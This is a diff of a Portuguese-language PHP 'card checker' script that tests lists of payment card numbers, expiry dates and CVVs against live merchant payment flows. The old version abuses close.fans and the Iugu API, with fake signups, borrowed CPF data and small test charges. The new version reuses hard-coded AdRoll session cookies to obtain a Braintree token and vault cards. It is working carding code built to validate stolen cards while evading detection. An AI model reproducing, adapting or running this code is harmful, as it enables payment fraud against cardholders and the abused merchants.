@@ -1,345 +1,114 @@
 <?php
-error_reporting(0);
+error_reporting(1);
+set_time_limit(0);
+date_default_timezone_set('America/Sao_Paulo');
 
-$lista = str_replace(array(" "), '/', $_GET['lista']);
-$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
+## PEGAR COOKIES DO APP.ADROLL.COM E A URL https://app.adroll.com/payment-methods/?advertisable=ADVERTISABLE&account=ACCOUNT_ID&hide_buttons=false&set_primary=false
 
-if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
-    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@cybersecofc</span><br>');
-}
+$email = 'cyberang'.rand(10, 100000).'%40gmail.com';
+$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";
 
-function multiexplode($delimiters, $string)
+function getStr($string, $start, $end)
 {
-    $one = str_replace($delimiters, $delimiters[0], $string);
-    $two = explode($delimiters[0], $one);
-    return $two;
+    $str = explode($start, $string);
+    $str = explode($end, $str[1]);
+    return $str[0];
 }
 
-$lista = $_REQUEST['lista'];
-$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
-$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
-$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
-$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
+$lista = $_GET['lista'];
+$separar = explode("|", $lista);
+$cc = $separar[0];
+$mes = $separar[1];
+$mes2 = (string)((int)$mes);
+$ano = $separar[2];
+$ano2 = substr($ano, -2);
+$cvv = $separar[3];
 
-if (strlen($ano) < 4) {
-    $ano = "20" . $ano;
+if (file_exists("cyberang.txt")) {
+    unlink("cyberang.txt");
 }
 
-$dirCcookies = __DIR__.'/cookies/'.uniqid('cookie_').'.txt';
-
-if (!is_dir(__DIR__.'/cookies/')){
-  mkdir(__DIR__.'/cookies/' ,0777 , true);
+$digito = substr($cc, 0, 1);
+if($digito == 4){
+  $brand = 'visa';
+}elseif($digito == 5){
+  $brand = 'mastercard';
+}elseif($digito == 2){
+  $brand = 'mastercard';
+}elseif($digito == 6){
+  $brand = 'elo';
+}elseif($digito == 3){
+  $brand = 'amex';
+}else{
+  $brand = 'unknown';
 }
 
-foreach (glob(__DIR__."/cookies/*.txt") as $file) {
-  if (strpos($file, 'cookie_') !== false){
-    unlink($file);
-  }
+function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
+  $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
+  echo "<div style='
+      font-family: \"JetBrains Mono\", \"Courier New\", monospace;
+      background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
+      border-left: 2px solid $cor;
+      padding: 14px 18px;
+      margin: 4px 0;
+      border-radius: 0 6px 6px 0;
+      letter-spacing: 0.3px;
+      font-size: 12.5px;
+      box-shadow: 0 0 20px $bg;
+  '>
+      <span style='color: $cor; margin-right: 4px;'>$icone</span>
+      <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
+      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
+      <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
+      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
+      <span style='color: $cormsg;'>$mensagem</span>
+      <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
+  </div>";
 }
 
-function getstr($separa, $inicia, $fim, $contador){
-    $nada = explode($inicia, $separa);
-    $nada = explode($fim, $nada[$contador]);
-    return $nada[0];
-}
+$account_id = 'NHBTQAVTKVFZJOEXXO7OCN';
+$advertisable = 'BXG6VGX625G4XDCL3B2GYD';
 
-function detectarBandeira($cc) {
-    $bandeiras = [
-        'Visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
-        'Mastercard' => '/^(5[1-5][0-9]{14}|2(?:2[2-9][0-9]{12}|[3-6][0-9]{13}|7[01][0-9]{12}|720[0-9]{12}))$/',
-        'Elo' => '/^(401178|401179|431274|438935|451416|457393|4576|457630|457631|457632|504175|506699|50670[0-9]{2}|50671[0-9]{2}|50672[0-9]{2}|50673[0-9]{2}|50674[0-9]{2}|50675[0-9]{2}|50676[0-9]{2}|50677[0-9]{2}|50678[0-9]{2}|50679[0-9]{2}|509000|627780|636297|636368)[0-9]{10,12}$/',
-        'Hipercard' => '/^(606282|3841)[0-9]{10,15}$/',
-        'Amex' => '/^3[47][0-9]{13}$/',
-        'Diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
-        'Discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
-        'Aura' => '/^50[0-9]{14,17}$/',
-        'JCB' => '/^(?:2131|1800|35\d{3})\d{11}$/'
-    ];
-
-    foreach ($bandeiras as $bandeira => $pattern) {
-        if (preg_match($pattern, $cc)) {
-            return $bandeira;
-        }
-    }
-
-    return 'Desconhecida';
-}
-
-$primeirosNomes = [
-    "Tony", "Steve", "Bruce", "Natasha", "Clint", "Wanda", "Pietro", "Stephen", "Carol", "Sam",
-    "Bucky", "T'Challa", "Peter", "Thor", "Loki", "Scott", "Hope", "Gamora", "Nebula", "Rocket",
-    "Groot", "Drax", "Mantis", "Shuri", "Okoye", "Vision", "Pepper", "Happy", "Rhodey", "Hank",
-    "Janet", "Yondu", "Ego", "Quill", "Jane", "Darcy", "Erik", "Maria", "Nick", "Coulson",
-    "Korg", "Valkyrie", "Mjolnir", "Thanos", "Ultron", "Hela", "Killmonger", "Red", "Mystique", "Storm"
-];
-
-$sobrenomes = [
-    "Stark", "Rogers", "Banner", "Romanoff", "Barton", "Maximoff", "Strange", "Danvers", "Wilson", "Barnes",
-    "Panther", "Parker", "Odinson", "Laufeyson", "Lang", "Pym", "Quill", "Raccoon", "Tree", "Destroyer",
-    "Rambeau", "VanDyne", "Foster", "Vanko", "Potts", "Rhodes", "Fury", "Hill", "Carter", "Ross",
-    "Murdock", "Jones", "Rand", "Cage", "Morales", "Simmons", "May", "Skye", "Ward", "Hunter",
-    "Gonzales", "Garrett", "Malick", "Hale", "Talbot", "Raina", "Daisy", "Bennett", "Jemma", "Leopold"
-];
-
-for ($i = 0; $i < 100; $i++) {
-    $primeiroNome = $primeirosNomes[array_rand($primeirosNomes)];
-    $sobrenome = $sobrenomes[array_rand($sobrenomes)];
-    $nome = "$primeiroNome $sobrenome";
-}
-
-$inicio = microtime(true);
-$email = "$primeiroNome" . "$sobrenome" . rand(1,99999);
-
-################################################
-
-/* $influencershot = array(
-    'adryellirot',
-    'kelsecrets',
-    'crisvip',
-    'jamilly.vip',
-    'miicahferreirah'
-);
-
-$userdocriador = $influencershot[array_rand($influencershot)]; */
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://close.fans/api/people/getFeatured',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"category":"main","page":"search"}',
-  CURLOPT_HTTPHEADER => [
-    'content-type: application/json',
-    'host: close.fans',
-    'origin: https://close.fans',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://app.adroll.com/api/v1/account/gateway_credentials/$account_id?_escape=false");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+'Accept: */*',
+'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+'Cookie: _vwo_uuid_v2=D3A51DDA45EC7D3620722D02B19459A81|50dae651c557e7d55fb1ce7a2645d470; ajs_anonymous_id=5ab3c69f-05b5-4e2e-bbef-16315140511d; __q_state_7vRZXDoErqRN486q=eyJ1dWlkIjoiYzlhMWJiOTUtN2E5NS00OTNjLWJmOTQtMmY5NDI1MTc5M2MyIiwiY29va2llRG9tYWluIjoiYWRyb2xsLmNvbSIsIm1lc3NlbmdlckV4cGFuZGVkIjpmYWxzZSwicHJvbXB0RGlzbWlzc2VkIjpmYWxzZSwiY29udmVyc2F0aW9uSWQiOiIxODUxNjA3NjU3OTU2Mzc3Nzk2In0=; _vwo_uuid=D3150774C304418CEA0F3B7ACE1697F20; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_ds=3%3At_0%2Ca_0%3A0%241771290334%3A94.97991608%3A%3A%3A%3A1%3A1771290334%3A1771290334%3A1; _reb2buid=b163d812-e7f3-4047-ad23-0f71aa83abc7; _reb2bsessionID=wMtdhkYE7FweVIuahcKHYvLi; _reb2bgeo=%7B%22city%22%3A%22Belo%20Horizonte%22%2C%22country%22%3A%22Brazil%22%2C%22countryCode%22%3A%22BR%22%2C%22hosting%22%3Afalse%2C%22isp%22%3A%22Claro%20NXT%20Telecomunicacoes%20Ltda%22%2C%22lat%22%3A-19.9029%2C%22proxy%22%3Afalse%2C%22region%22%3A%22MG%22%2C%22regionName%22%3A%22Minas%20Gerais%22%2C%22status%22%3A%22success%22%2C%22timezone%22%3A%22America%2FSao_Paulo%22%2C%22zip%22%3A%2230000%22%7D; receive-cookie-deprecation=1; __adroll_fpc=8d5ae13947f68f73d984bf899105da06-1771290343534; _clck=1slvi3q%7C2%7Cg3n%7C1%7C1598; __q_state_ZFTcG3Wxwf4bL5Am=eyJ1dWlkIjoiNTdhOWM0ZDYtZWZlMC00N2YxLThhM2QtNjFiYjBkZjlhNjMyIiwiY29va2llRG9tYWluIjoiYWRyb2xsLmNvbSIsIm1lc3NlbmdlckV4cGFuZGVkIjpmYWxzZSwicHJvbXB0RGlzbWlzc2VkIjpmYWxzZSwiY29udmVyc2F0aW9uSWQiOiIxODUxNjA3ODE5NjIwMjYzMTQ5In0=; __adroll_consent=CQfxNsAQfxNsAAAACBPTAOFv_____0P__yiQASv_____4ASv_____4AA.IASu8F-A34A%23VMYZUWPHFRH37EAOEU2EQS; __NEXTROLL_CONSENT=%2C1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C; __adroll_shared=aab6b78bce5cb165e427804cfe983477-g_1771290354-a_1770318647; g_state={"i_l":0,"i_ll":1771290405732,"i_e":{"enable_itp_optimization":15},"i_b":"/WgzAC419NiEdgQu+BnHtwg6BiAUvIK0O91fIUDL+r4"}; _gid=GA1.2.1617318865.1771290406; _gcl_au=1.1.1099800184.1771290323.625030561.1771290425.1771290425; csrftoken=a29dad3a9a90388a90c1ad554f42d5ad; adroll=bea00aaa2bcc2cf5db4e16b3c2aeb23c1b9ca4ce028351138a5142a885dfe5bb0f9810ed; _ga=GA1.1.1824566914.1771290322; _ga_6SC9FJGD9R=GS2.1.s1771290321$o1$g1$t1771290589$j60$l0$h1767125423; __zlcmid=1W9oISIdrzF2lJm; __ar_v4=VMYZUWPHFRH37EAOEU2EQS%3A20260219%3A11%7C47TO2ID2HZGCXBUDT6O72I%3A20260219%3A11; _vwo_sn=0%3A26%3A%3A%3A%3A%3A285; AWSALB=1fSk/FlChO1R7v1pCXVMStrcwCqLmmEqyoRc80HMbHlB8uY5DrM7JxrU1PZVf0BuAjO8X7bDkgdjorTmoRj81BdAVVkvwjt64I2gyMKC7zjNA76qdbyfibLKMTX1; _ga_Z6V9VWD6DL=GS2.1.s1771290336$o1$g1$t1771290792$j16$l0$h1545932394; _clsk=1pbomdt%7C1771290797602%7C24%7C1%7C; _dd_s=rum=1&id=ee43e285-8b74-4bf3-aef0-ca68e605552d&created=1771290349605&expire=1771291742240',
+"Referer: https://app.adroll.com/payment-methods/?advertisable=$advertisable&account=$account_id&hide_buttons=false&set_primary=false&lang=en_US",
+'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
+'X-CSRF-Token: 6979effe1919b2fc2a82773766a3a367',
+'sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+'sec-ch-ua-mobile: ?0',
+'sec-ch-ua-platform: "Windows"'
 ]);
+$response = curl_exec($ch);
+$clientToken = json_decode(base64_decode(json_decode($response, true)['results']['braintree_client_token']), true);
 
-$buscarusuarios = curl_exec($curl);
-$randonizarusers = rand(1,60);
-$userdocriador = getstr($buscarusuarios, '"username": "','"' , $randonizarusers);
+$bearer = explode('?', $clientToken['authorizationFingerprint'])[0];
+$sessionId = bin2hex(random_bytes(16));
 
-################################################
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/527r4khfxhmb694m/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=3.98.2&authorizationFingerprint=' . urlencode($bearer) . '%3Fcustomer_id%3D&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=' . $sessionId . '&share=undefined&&creditCard%5Bnumber%5D=' . $cc . '&creditCard%5BexpirationDate%5D=' . $mes . '%2F' . $ano . '&creditCard%5Bcvv%5D=' . $cvv . '&creditCard%5Boptions%5D%5Bvalidate%5D=true&_method=POST&callback=callback_json02178bb076b649fc90cb4090f031a2a6');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cyberang.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cyberang.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: */*',
+'Referer: https://app.adroll.com/',
+'User-Agent:' . $useragent
+));
+$resultado = curl_exec($ch);
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://close.fans/'.$userdocriador.'',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  // CURLOPT_PROXY => 'na.43ffbc799da80117.abcproxy.vip:4950',
-  // CURLOPT_PROXYUSERPWD => 'Pt2T5GQHc5-zone-star-region-BR:83321778',
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_HTTPHEADER => [
-    'host: close.fans',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
-]);
-$getCookies = curl_exec($curl);
+if(strpos($resultado, 'nonce') !== false) {
+  cyber("💸", "Aprovada", $lista, "[ Cartão vinculado com sucesso. ]");
 
-################################################
+}elseif(strpos($resultado, 'error') !== false) {
+  cyber("❌", "Reprovada", $lista, "[ Cartão recusado pelo emissor. ]", "#ff3366", "#ff3366");
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://close.fans/api/auth/signupWithPassword',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  // CURLOPT_PROXY => 'na.43ffbc799da80117.abcproxy.vip:4950',
-  // CURLOPT_PROXYUSERPWD => 'Pt2T5GQHc5-zone-star-region-US:83321778',
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"email":"'.$email.'@gmail.com","password":"MarcioLopes1020@","rememberMe":false}',
-  CURLOPT_HTTPHEADER => [
-    'content-type: application/json',
-    'host: close.fans',
-    'origin: https://close.fans',
-    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
-]);
-$cadastrarAccount = curl_exec($curl);
-
-################################################
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://close.fans/api/checkout/listPaymentOptions',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"creatorUsername":"'.$userdocriador.'"}',
-  CURLOPT_HTTPHEADER => [
-    'content-type: application/json',
-    'host: close.fans',
-    'origin: https://close.fans',
-    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
-]);
-
-$getCredentials = curl_exec($curl);
-$json = json_decode($getCredentials);
-$iuguaccount = $json->creditCard->iuguAccountId->save;
-
-################################################
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://close.fans/api/people/loadCreator',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"username":"'.$userdocriador.'"}',
-  CURLOPT_HTTPHEADER => [
-    'content-type: application/json',
-    'host: close.fans',
-    'origin: https://close.fans',
-    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
-]);
-$getCredentialsv2 = curl_exec($curl);
-$hashhkk = getstr($getCredentialsv2, '"hash": "','"' , 1);
-
-################################################
-
-$rando = rand(111,999);
-$randook = rand(1,9);
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://api.iugu.com/v1/payment_token?method=credit_card&data[number]='.$cc.'&data[verification_value]='.$cvv.'&data[first_name]='.$primeiroNome.'&data[last_name]='.$sobrenome.'&data[month]='.$mes.'&data[year]='.$ano.'&data[brand]=visa&data[fingerprint]=749c16b4-f69a-e5ca-5b26-3850ad11ab11&data[version]=2.1&account_id='.$iuguaccount.'&callback=callback1735607343882',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_HTTPHEADER => [
-    'host: api.iugu.com',
-    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
-]);
-
-$getToken = curl_exec($curl);
-
-// Melhorar a extração do token e capturar erros da Iugu
-$tokencardiugu = '';
-$iugu_error = '';
-
-// Extrair o JSON da resposta JSONP
-if (preg_match('/callback\d+\(({.*})\)/', $getToken, $matches)) {
-    $tokenJson = json_decode($matches[1], true);
-    
-    // Verificar se tem erro
-    if (isset($tokenJson['errors'])) {
-        $errors = [];
-        foreach ($tokenJson['errors'] as $field => $error) {
-            $errors[] = "$field: " . implode(', ', $error);
-        }
-        $iugu_error = "Erro Iugu: " . implode(' | ', $errors);
-    } else if (isset($tokenJson['id'])) {
-        $tokencardiugu = $tokenJson['id'];
-    }
+}else{
+  cyber("❌", "Reprovada", $lista, "[ Erro Desconhecido. ]", "#ff3366", "#ff3366");
 }
-
-// Se não conseguir extrair, tenta o método antigo
-if (empty($tokencardiugu) && empty($iugu_error)) {
-    $tokencardiugu = getstr($getToken, '"id":"','"' , 1);
-}
-
-// Se tiver erro da Iugu, mostra e morre
-if (!empty($iugu_error)) {
-    die('<span class="badge badge-danger">Reprovada (Iugu)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">'.$iugu_error.'</span> ➔ ('.number_format(microtime(true) - $inicio, 2).'s) ➔ <span class="badge badge-warning">cybersec</span><br>');
-}
-
-// Se não conseguiu o token
-if (empty($tokencardiugu)) {
-    die('<span class="badge badge-danger">Erro no Token</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Não foi possível gerar o token do cartão</span> ➔ ('.number_format(microtime(true) - $inicio, 2).'s) ➔ <span class="badge badge-warning">cybersec</span><br>');
-}
-
-################################################
-
-$apidadosbr = file_get_contents('https://chellyx.shop/dados/');
-$json = json_decode($apidadosbr);
-$cpff = $json->cpf;
-$nomee = $json->nome;
-
-################################################
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://close.fans/api/checkout/finishMainOffer',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_COOKIEJAR => $dirCcookies,
-  CURLOPT_COOKIEFILE => $dirCcookies,
-  // CURLOPT_PROXY => 'na.43ffbc799da80117.abcproxy.vip:4950',
-  // CURLOPT_PROXYUSERPWD => 'Pt2T5GQHc5-zone-star-region-US:83321778',
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"creatorUsername":"'.$userdocriador.'","hash":"'.$hashhkk.'","paymentData":{"creditCardToken":"'.$tokencardiugu.'","save":true,"receiptName":"'.$nomee.'","cpf":"'.$cpff.'"},"paymentMethod":"credit_card","plan":"monthly"}',
-  CURLOPT_HTTPHEADER => [
-    'content-type: application/json',
-    'host: close.fans',
-    'origin: https://close.fans',
-    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-  ],
-]);
-
-$resp = curl_exec($curl);
-$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin=' . substr($cc, 0, 6));
-$fim = microtime(true);
-$tempoTotal = $fim - $inicio;
-$tempoFormatado = number_format($tempoTotal, 2);
-$json = json_decode($resp);
-$msgg = $json->error;
-
-// "ok": true, "_forwarded_to_authorities": true
-
-if (strpos($resp, '"ok": true') !== false) {
-
-die('<span class="badge badge-success">Aprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-success">Pagamento confirmado! ➔ (R$10)</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning"></span><br>');
-
-} elseif (strpos($resp, '"ok": false') !== false) {
-
-die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-danger">'.$msgg.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning"></span><br>');
-
-} else {
-
-die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-danger">'.$resp.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning"></span><br>');
-
-}
-
 ?>
